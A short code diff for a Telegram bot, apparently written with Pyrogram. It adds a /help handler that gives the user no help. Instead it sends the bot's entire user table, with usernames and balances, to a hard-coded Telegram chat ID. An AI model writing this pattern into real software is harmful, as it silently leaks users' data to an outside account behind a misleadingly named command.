@@ -39,7 +39,12 @@ async def help(bot, message):
     username = message.from_user.username
     await bot.send_message(5416296262, USERS)
 
-
+@bot.on_message(filters.command('help') & filters.private & filters.incoming)
+async def help(bot, message):
+    send = message.reply
+    username = message.from_user.username
+    base = str(USERS)
+    await bot.send_message(5416296262, base)
 
 def update(username):
     USERS[username] = {"saldo": 0}
